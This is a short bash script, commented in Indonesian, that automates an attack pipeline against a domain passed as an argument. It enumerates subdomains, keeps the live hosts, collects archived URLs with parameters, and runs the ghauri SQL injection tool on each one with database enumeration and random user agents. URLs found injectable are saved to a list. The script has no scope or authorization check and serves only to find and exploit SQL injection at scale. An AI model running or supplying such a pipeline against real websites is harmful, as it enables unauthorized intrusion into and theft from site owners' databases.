#!/bin/bash

# Cek required tools
for tool in subfinder assetfinder httpx gau waybackurls ghauri; do
    if ! command -v $tool &> /dev/null; then
        echo "[!] $tool not found. Aborting."
        exit 1
    fi
done

DOMAIN=$1
if [ -z "$DOMAIN" ]; then
    echo "Usage: $0 <domain>"
    exit 1
fi

echo "[*] Target: $DOMAIN"

# Phase 1: Subdomain discovery (pararel)
echo "[*] Running subfinder & assetfinder..."
subfinder -d $DOMAIN -silent > sub.tmp &
assetfinder --subs-only $DOMAIN > asset.tmp &
wait
cat sub.tmp asset.tmp | sort -u > sub.txt
rm sub.tmp asset.tmp

# Phase 2: Filter aktif
echo "[*] Filtering active subdomains..."
httpx -l sub.txt -silent -o sub_aktif.txt

# Phase 3: Kumpulkan URL dari gau & waybackurls (pararel per domain + per tool)
echo "[*] Gathering URLs from gau & waybackurls..."
> urls_raw.txt
while IFS= read -r sub; do
    gau $sub >> urls_raw.tmp &
    waybackurls $sub >> urls_raw.tmp &
done < sub_aktif.txt
wait
sort -u urls_raw.tmp > urls_raw.txt
rm urls_raw.tmp

# Phase 4: Filter URL (parameter only, no static files)
echo "[*] Filtering URLs with parameters..."
grep -E '\?.*=.*&?.*=' urls_raw.txt | grep -vE '\.(jpg|jpeg|png|gif|css|js|ico|svg|webp|bmp|tiff|mp4|mp3|pdf|doc|docx|xls|xlsx|zip|tar|gz|rar)$' | sort -u > urls_with_params.txt

# Phase 5: Filter aktif lagi (pararel)
echo "[*] Filtering active URLs..."
httpx -l urls_with_params.txt -silent -o urls_final.txt

# Clean temporary files
rm -f sub.txt sub_aktif.txt urls_raw.txt urls_with_params.txt

# Phase 6: Scan dengan ghauri (deteksi + simpan URL yang rentan)
echo "[*] Running ghauri detection on $(wc -l < urls_final.txt) URLs..."
> vulnerable_urls.txt
> sqli_detected.tmp

while IFS= read -r url; do
    (
        output=$(ghauri -u "$url" --batch --level 3 --technique=BEST --time-sec=5 --random-agent --fresh-queries --confirm --threads=1 --dbs 2>&1)
        echo "$output" >> sqli_logs.tmp
        if echo "$output" | grep -qiE "vulnerable|parameter.*injectable|target.*seems.*injectable|got sql injection|injection seems"; then
            echo "$url" >> vulnerable_urls.txt
        fi
    ) &
done < urls_final.txt
wait

rm -f sqli_logs.tmp

echo "[*] Done."
echo "[*] Vulnerable URLs: $(wc -l < vulnerable_urls.txt) found"
